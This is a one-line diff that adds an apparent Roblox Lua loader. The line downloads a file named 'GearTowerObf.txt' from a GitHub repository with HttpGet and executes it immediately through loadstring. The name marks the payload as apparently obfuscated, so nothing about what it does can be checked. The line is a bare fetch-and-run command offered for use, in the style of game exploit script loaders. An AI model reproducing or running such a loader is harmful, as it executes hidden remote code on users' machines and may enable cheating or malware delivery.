@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://github.com/contateste8/GearTower/raw/refs/heads/main/GearTowerObf.txt"))()
